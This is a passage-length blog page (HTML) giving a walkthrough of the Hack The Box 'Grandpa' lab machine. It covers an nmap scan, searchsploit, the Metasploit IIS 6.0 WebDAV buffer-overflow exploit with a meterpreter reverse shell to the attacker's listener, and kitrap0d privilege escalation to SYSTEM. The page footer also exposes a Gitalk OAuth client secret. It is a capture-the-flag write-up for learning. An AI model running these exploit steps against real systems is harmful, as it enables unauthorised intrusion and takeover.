<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Grandpa - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Grandpaé¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:type" content="article">
<meta property="og:title" content="Grandpa - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Grandpaé¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/ba430d66-a24b-4a0d-8223-ac94cd49594a.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/052f67c1-374a-4fc7-b687-06611a9e0814.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/c400ace0-ff4f-481f-a909-af3f8fde64aa.png">
<meta property="article:published_time" content="2022-03-28T11:38:36.000Z">
<meta property="article:modified_time" content="2023-05-20T01:51:27.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/ba430d66-a24b-4a0d-8223-ac94cd49594a.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Grandpa - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Grandpa - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-03-28T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-03-28
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Grandpa"><span class="post-toc-text">Hackthebox - Grandpa</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Searchsploit"><span class="post-toc-text">Searchsploit</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox - Grandpa"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Grandpa - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-03-28 19:38:36" datetime="2022-03-28T11:38:36.000Z"  itemprop="datePublished">2022-03-28</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Grandpa"><a href="#Hackthebox-Grandpa" class="headerlink" title="Hackthebox - Grandpa"></a>Hackthebox - Grandpa</h1><h1 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/28/Hackthebox%20-%20Grandpa/ba430d66-a24b-4a0d-8223-ac94cd49594a.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/28/Hackthebox%20-%20Grandpa/052f67c1-374a-4fc7-b687-06611a9e0814.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Grandpa]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.14
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-25 02:52 EDT
Nmap scan report for 10.10.10.14
Host is up (0.53s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Fri, 25 Mar 2022 06:53:29 GMT
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   524.27 ms 10.10.16.1
2   524.42 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.52 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/28/Hackthebox%20-%20Grandpa/c400ace0-ff4f-481f-a909-af3f8fde64aa.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>è¿™é‡Œæç¤ºæ²¡æœ‰é»˜è®¤é¡µé¢ï¼Œå»çœ‹çœ‹æ˜¯ä¸æ˜¯ IIS æœ¬èº«çš„æ¼æ´å§</p>
<h2 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h2><pre><code class="bash">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# searchsploit IIS 6.0      
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                  | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                           | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                             | windows/dos/9587.txt
Microsoft IIS 6.0 - &#39;/AUX / &#39;.aspx&#39; Remote Denial of Service                                                                                                                      | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                            | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Overflow                                                                                                          | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                           | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                       | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                       | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                   | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                          | windows/remote/19033.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>æˆ‘ä»¬çœ‹çœ‹ Microsoft IIS 6.0 - WebDAV â€˜ScStoragePathFromUrlâ€™ Remote Buffer Overflow è¿œç¨‹ç¼“å†²åŒºæº¢å‡ºï¼Œæ„Ÿè§‰æœ‰æˆ</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>å…ˆå»çœ‹çœ‹ msf æœ‰æ²¡æœ‰ç›¸å…³çš„æ¼æ´åˆ©ç”¨æ¨¡å—</p>
<pre><code class="bash">msf6 &gt; search IIS 6.0

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/firewall/blackice_pam_icq            2004-03-18       great   No     ISS PAM.dll ICQ Parser Buffer Overflow
   1  auxiliary/dos/windows/http/ms10_065_ii6_asp_dos      2010-09-14       normal  No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   2  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow

Interact with a module by name or index. For example info 2, use 2 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl
</code></pre>
<p>è¿™è¾¹ç¡®å®æœ‰ä¸€ä¸ªï¼Œå»åŠ è½½ä¸€ä¸‹è¯•è¯•</p>
<pre><code class="bash">msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options 

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.14      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
</code></pre>
<p>è®¾ç½®å¥½ç›¸å…³çš„é…ç½®ï¼Œç„¶åæ‰§è¡Œ</p>
<pre><code class="bash">msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.4:4444 -&gt; 10.10.10.14:1031) at 2022-03-25 03:31:02 -0400

meterpreter &gt; shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2056 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv&gt;whoami
whoami
nt authority\network service
</code></pre>
<p>æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell ä¸è¿‡æƒé™å¾ˆä½</p>
<p>ä½¿ç”¨ background è¿”å›</p>
<h1 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h1><p>ä½¿ç”¨ post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester è¿›è¡Œææƒè„šæœ¬æŸ¥è¯¢</p>
<pre><code class="bash">msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) &gt; show options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) &gt; set session 2
session =&gt; 2
</code></pre>
<p>è®¾ç½®å¥½ä»¥åï¼Œexploit æ‰§è¡Œ</p>
<pre><code class="bash">msf6 post(multi/recon/local_exploit_suggester) &gt; exploit 

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
</code></pre>
<p>ä»¥ä¸Šéƒ½æ˜¯å½“å‰æœºå™¨ä¸‹å¯èƒ½å¯ç”¨çš„ææƒæ¨¡å—</p>
<pre><code class="bash">exploit/windows/local/ms10_015_kitrap0d
</code></pre>
<p>æŒ¨ä¸ªå°è¯•åï¼Œéƒ½æ˜¯æç¤ºæ²¡æœ‰æƒé™ â€œExploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.â€</p>
<pre><code class="bash">meterpreter &gt; getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
</code></pre>
<p>ç›´æ¥ä½¿ç”¨ getuid å‘½ä»¤ä¹Ÿæ˜¯ä¸è¡Œçš„</p>
<pre><code class="bash">meterpreter &gt; ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 532   584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 584   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1308  392   VGAuthService.exe
 1380  392   vmtoolsd.exe
 1484  392   svchost.exe
 1588  392   svchost.exe
 1768  392   dllhost.exe
 1908  392   alg.exe
 1936  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2404  584   wmiprvse.exe
 2604  344   logon.scr
 2656  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3408  2656  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3892  1072  cidaemon.exe
 3936  1072  cidaemon.exe
 3972  1072  cidaemon.exe

meterpreter &gt; migrate 1936
[*] Migrating from 3408 to 1936...
[*] Migration completed successfully.
</code></pre>
<p>å°è¯•ä¸€ä¸‹è¿›ç¨‹è¿ç§»</p>
<pre><code class="bash">meterpreter &gt; getuid
Server username: NT AUTHORITY\NETWORK SERVICE
</code></pre>
<p>è¿›ç¨‹è¿ç§»åå¯ä»¥æ‰§è¡Œ getuid å‘½ä»¤</p>
<p>å†å°è¯•ä¸€ä¸‹ææƒæ¨¡å— exploit&#x2F;windows&#x2F;local&#x2F;ms10_015_kitrap0d</p>
<pre><code class="bash">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options 

Module options (exploit/windows/local/ms10_015_kitrap0d):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
   LHOST     10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Windows 2K SP4 - Windows 7 (x86)
</code></pre>
<p>ç„¶åæ‰§è¡Œ</p>
<pre><code class="bash">msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:5555 
[*] Launching notepad to host the exploit...
[+] Process 408 launched.
[*] Reflectively injecting the exploit DLL into 408...
[*] Injecting exploit into 408 ...
[*] Exploit injected. Injecting payload into 408...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.4:5555 -&gt; 10.10.10.14:1031) at 2022-03-27 21:33:07 -0400

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>æˆåŠŸææƒåˆ° system æƒé™</p>
<pre><code class="bash">meterpreter &gt; search -f user.txt
Found 1 result...
    c:\Documents and Settings\Harry\Desktop\user.txt (32 bytes)
meterpreter &gt; search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter &gt; cat &#39;c:\Documents and Settings\Harry\Desktop\user.txt&#39;
bdff5ec67c3cff017f2bedc146a5d869

meterpreter &gt; cat &#39;c:\Documents and Settings\Administrator\Desktop\root.txt&#39;
9359e905a2c35f861f6a57cecf28bb7b

meterpreter &gt;
</code></pre>
<p>æˆåŠŸæ‹¿åˆ° user å’Œ root æƒé™çš„ flag æ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&title=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&title=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/03/29/Hackthebox%20-%20Granny/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Granny - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/03/25/Hackthebox%20-%20Arctic/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Arctic - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        ç«™ç‚¹æ€»è®¿å®¢æ•°ï¼š<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        ç«™ç‚¹æ€»è®¿é—®é‡ï¼š<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&title=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&title=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠGrandpa - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/28/Hackthebox%20-%20Grandpa/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>æ‰«ä¸€æ‰«ï¼Œåˆ†äº«åˆ°å¾®ä¿¡</p>
